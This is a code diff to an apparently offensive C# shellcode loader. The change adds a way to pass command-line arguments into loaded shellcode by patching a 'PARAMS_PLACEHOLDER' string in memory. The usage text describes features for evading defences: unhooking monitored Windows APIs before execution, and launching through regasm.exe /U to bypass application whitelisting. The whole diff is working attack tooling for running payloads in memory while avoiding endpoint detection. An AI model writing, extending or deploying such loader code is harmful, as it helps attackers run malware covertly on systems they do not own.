@@ -19,8 +19,14 @@ namespace ShellcodeLoader
         {
             Console.WriteLine("RegAsm mode engaged");
             List<string> args = new List<string>();
-            foreach (string arg in Environment.GetCommandLineArgs())
+            string[] original_args = Environment.GetCommandLineArgs().Select(e => e.TrimStart('+')).ToArray();
+            foreach (string arg in original_args)
             {
+                if (arg == "--")
+                {
+                    Program.parseShellcodeArgs(original_args);
+                    break;
+                }
                 switch (arg.Split('=')[0]) {
                     case "--no-unhook":
                         args.Add(arg.Split('=')[0]);
@@ -43,6 +49,8 @@ namespace ShellcodeLoader
 
     public class Program
     {
+        private static bool unhook = true;
+        internal static List<string> shellcode_args = new List<string>();
         private class Delegates
         {
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -50,7 +58,6 @@ namespace ShellcodeLoader
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             internal delegate IntPtr Sleep(uint dwMilliseconds);
         }
-        private static bool unhook = true;
         private static byte[] StringToByteArray(string hex)
         {
             byte[] outr = new byte[(hex.Length / 2) + 1];
@@ -68,6 +75,55 @@ namespace ShellcodeLoader
             {
                 ptr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
             }
+        }
+
+        private unsafe static bool checkString(byte* addr, byte[] str)
+        {
+            for (int i = 0; i<str.Length; i++)
+            {
+                if (str[i] != addr[i])
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        private unsafe static bool patchCliArgs(ref IntPtr addr, uint size, string[] args)
+        {
+            byte* ptr = (byte*)addr;
+            byte[] placeholder = Encoding.ASCII.GetBytes("PARAMS_PLACEHOLDER");
+
+            // Find the placeholder inside the shellcode
+            int offset = -1;
+            for (int i = 0; i < size; i++)
+            {
+                if (checkString(ptr+i, placeholder))
+                {
+                    offset = i;
+                    break;
+                }
+            }
+            
+            if (offset == -1)
+            {
+                Console.Error.WriteLine("Warning: CLI Args placeholder not found. Runtime args will not work.");
+                return false;
+            }
+
+            // Patch the placeholder with the real args
+            byte[] args_str = Encoding.ASCII.GetBytes(string.Join(" ", args));
+            for (int i = 0; i < args_str.Length; i++)
+            {
+                ptr[offset + i] = args_str[i];
+            }
+
+            // Zero-out the rest for 256 bytes (donut constant)
+            for (int i = args_str.Length; i < 256; i++)
+            {
+                ptr[offset + i] = 0;
+            }
+            return true;
         }
 
         private unsafe static void writeBinPayloadToMem(byte[] payload, ref IntPtr addr)
@@ -168,16 +224,39 @@ namespace ShellcodeLoader
         private static void usage()
         {
             StringBuilder sb = new StringBuilder();
-            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [shellcode_file|--base64 base64_shellcode]");
+            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [shellcode_file|--base64 base64_shellcode] [-- shellcode_param1 [shellcode_param2...]]");
             sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
-            sb.AppendLine("\base64_shellcode\tshellcode in base64 format");
+            sb.AppendLine("\\base64_shellcode\tshellcode in base64 format");
+            sb.AppendLine("\\--\tEverything after \"--\" is passed to the shellcode as CLI arguments.");
             sb.AppendLine("If <shellcode_file> is not specified, the program will search for \"shellcode.bin\" the current working directory and then in C:\\Users\\Public.");
             sb.AppendLine("\t-p password\t[TEMPORARILY DISABLED] if a password is required for the key, it will be read from this parameter instead of asking interactively");
             sb.AppendLine("\t--no-unhook\tDON'T UNHOOK API before loading the shellcode");
             sb.AppendLine("\t--base64\tThe positional argument is directly the shellcode in base64 format.");
             sb.AppendLine("\nREGASM Mode:");
-            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [--no-unhook] [--file=shellcode_file|--base64=base64_shellcode]");
+            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [+--no-unhook] [+--file=shellcode_file|+--base64=base64_shellcode]  [+-- shellcode_param1 [shellcode_param2...]]");
+            sb.AppendLine("NOTE: Due to regasm complaining about wrong parameters, EVERY argument starting with a '-' MUST be prefixed with a '+', this also applies to shellcode params.(the '+' will be automatically removed during paring).");
             Console.WriteLine(sb.ToString());
+        }
+
+        internal static void parseShellcodeArgs(string[] args)
+        {
+            bool add = false;
+            foreach (string arg in args)
+            {
+                if (add)
+                {
+                    string new_arg = arg;
+                    if (new_arg.Contains(' ') && !new_arg.Contains('"'))
+                    {
+                        new_arg = ('"' + new_arg + '"');
+                        new_arg = new_arg.Replace(@"\""", @"\\""");  
+                    }
+                    Program.shellcode_args.Add(new_arg);
+                } else if (arg == "--")
+                {
+                    add = true;
+                }
+            }
         }
 
         public static int Main(string[] args)
@@ -189,6 +268,11 @@ namespace ShellcodeLoader
 
             for (int i = 0; i < args.Length; i++)
             {
+                if (args[i] == "--")
+                {
+                    parseShellcodeArgs(args);
+                    break;
+                }
                 switch (args[i])
                 {
                     case "--no-unhook":
@@ -339,16 +423,23 @@ namespace ShellcodeLoader
             if (LOLZFormat)
             {
                 writeHexPayloadToMem(strpayload, ref addr);
+                // Decrypt shellcode
+                if (key != null)
+                {
+                    decryptKeying(ref addr, key, payloadSize);
+                }
+                Console.Write("Patching CLI arguments... ");
+                if (patchCliArgs(ref addr, payloadSize, Program.shellcode_args.ToArray()))
+                {
+                    Console.WriteLine("OK");
+                } else
+                {
+                    Console.WriteLine("not supported (placeholder not found)");
+                }
             }
             else
             {
                 writeBinPayloadToMem(rawcontent, ref addr);
-            }
-
-            // Decrypt shellcode
-            if (key != null)
-            {
-                decryptKeying(ref addr, key, payloadSize);
             }
 
             // Launch
